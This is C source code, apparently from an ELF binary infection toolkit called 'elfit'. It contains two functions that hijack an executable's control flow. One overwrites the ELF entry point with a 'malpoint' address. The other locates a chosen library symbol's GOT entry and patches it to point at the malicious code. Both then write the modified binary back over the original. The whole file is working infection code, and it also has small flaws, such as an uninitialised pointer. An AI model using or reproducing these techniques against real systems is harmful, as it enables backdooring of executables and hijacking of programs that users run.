#include "elfit.h"

int entry_redirect(Elfit_t *host, unsigned long malpoint)
{
    int ofd, c;
    Elf32_Ehdr *ehdr;
    
    printf("Patching host's entrypoint to 0x%x\n", malpoint);

    ehdr = (Elf32_Ehdr *) host->mem;

    ehdr->e_entry = malpoint;

    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
        < 0)
    {
        perror("tmp binary: open");
        return -1; 
    }

    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
    {
        perror("tmp binary: write");
        return -1;
    }

    rename(TMP, host->name);
    return 1;
}

Elf32_Addr got_redirect(Elfit_t *host, char *target, unsigned long malpoint)
{
    Elf32_Ehdr *ehdr;
    Elf32_Shdr *shdr;
    Elf32_Phdr *phdr;
    Elf32_Rel *rel;
    Elf32_Sym *dynsym;
    char *dynstr;
    int i, c, ofd; 
    int relindex, dynsymindex, dynstrindex;
    Elf32_Addr data_vaddr, gotptr;
    Elf32_Off data_offset, relocptr;

    ehdr = (Elf32_Ehdr *) host->mem;     
    phdr = (Elf32_Phdr *) (host->mem + ehdr->e_phoff); 
    shdr = (Elf32_Shdr *) (host->mem + ehdr->e_shoff);

    if ((relindex = get_section_by_name(".rel.plt", host)) == -1)
    {
        printf("could not find relocation table\n");
        return -1;
    }
    rel = (Elf32_Rel *) (host->mem + shdr[relindex].sh_offset);

    if ((dynsymindex = get_section_by_name(".dynsym", host)) == -1)
    {
        printf("could not find dynamic symbol table\n");
        return -1;
    }
    dynsym = (Elf32_Sym *) (host->mem + shdr[dynsymindex].sh_offset);

    if ((dynstrindex = get_section_by_name(".dynstr", host)) == -1)
    {
        printf("could not find dynamic string table\n");
        return -1;
    }
    dynstr = (char *) (host->mem + shdr[dynstrindex].sh_offset);

    for(i = 0; i < (shdr[relindex].sh_size / sizeof(Elf32_Rel)); i++)
    {
        if (strcmp(&dynstr[dynsym[ELF32_R_SYM(rel[i].r_info)].st_name], target) == 0)
        {
            gotptr = (Elf32_Addr) rel[i].r_offset; /* vaddr of position to patch */
        }
    }

    if (!gotptr)
    {
        printf("could not retrieve got entry for the specified symbol\n");
        return -1;
    }

    /* grab data segment information */
    for(i = 0; i < ehdr->e_phnum; i++)
    {
        if (phdr[i].p_type == PT_LOAD)
        {
            data_vaddr = phdr[i+1].p_vaddr;
            data_offset = phdr[i+1].p_offset;
            break;
        }
    }

    relocptr = data_offset + ((Elf32_Off) (gotptr - data_vaddr));

    printf("Patching 0x%x (offset 0x%x) with 0x%x\n",
        gotptr, relocptr,  malpoint);
    *(unsigned long*)&host->mem[relocptr] = malpoint;

    /* writing changes to a file */
    if ((ofd = open(TMP, O_CREAT | O_WRONLY | O_TRUNC, host->file->st_mode))
        < 0)
    {
        perror("tmp binary: open");
        return -1; 
    }

    if ((c = write(ofd, host->mem, host->file->st_size)) != host->file->st_size)
    {
        perror("tmp binary: write");
        return -1;
    }

    rename(TMP, host->name);
    
    return gotptr;
}
